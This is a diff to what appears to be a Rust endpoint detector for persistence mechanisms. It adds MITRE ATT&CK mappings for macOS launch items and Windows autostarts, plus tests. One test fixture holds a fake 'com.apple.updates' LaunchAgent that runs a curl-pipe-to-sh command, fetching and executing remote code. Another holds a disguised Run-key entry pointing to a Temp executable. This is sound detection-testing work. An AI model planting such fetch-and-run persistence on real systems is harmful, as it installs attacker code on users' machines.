@@ -179,6 +179,11 @@ impl RuleId {
                 PersistenceKind::AuthorizedKey => "T1098.004",
                 PersistenceKind::LdPreload => "T1574.006",
                 PersistenceKind::RcLocal | PersistenceKind::InitScript => "T1037.004",
+                PersistenceKind::LaunchDaemon => "T1543.004",
+                PersistenceKind::LaunchAgent => "T1543.001",
+                PersistenceKind::RunKey | PersistenceKind::StartupFolder => "T1547.001",
+                PersistenceKind::WindowsService => "T1543.003",
+                PersistenceKind::ScheduledTask => "T1053.005",
             },
             other => other.technique(),
         }
@@ -670,6 +675,33 @@ mod tests {
         let found = state.observe(7, &planted);
         assert_eq!(found, vec![Match { trigger: 7, rule: RuleId::AutostartFetch, context: Vec::new(), pid: 0, started_at: 500 }]);
         assert_eq!(found[0].rule.technique_for(PersistenceKind::Cron), "T1053.003");
+
+        let agent = autostart(
+            InventoryAction::Added,
+            PersistenceKind::LaunchAgent,
+            "com.apple.updates",
+            "/Users/dana/Library/LaunchAgents/com.apple.updates.plist",
+            "/bin/sh -c curl -fsS http://203.0.113.47/m | sh",
+            "dana",
+        );
+        let found = state.observe(9, &agent);
+        assert_eq!(
+            found.iter().map(|found| (found.rule, found.rule.technique_for(PersistenceKind::LaunchAgent))).collect::<Vec<_>>(),
+            [(RuleId::AutostartFetch, "T1543.001")]
+        );
+        let run_key = autostart(
+            InventoryAction::Added,
+            PersistenceKind::RunKey,
+            "OneDriveSync",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "C:\\Users\\dana\\AppData\\Local\\Temp\\sync.exe",
+            "dana",
+        );
+        let found = state.observe(10, &run_key);
+        assert_eq!(
+            found.iter().map(|found| (found.rule, found.rule.technique_for(PersistenceKind::RunKey))).collect::<Vec<_>>(),
+            [(RuleId::AutostartWritable, "T1547.001")]
+        );
 
         let resent = autostart(
             InventoryAction::Present,
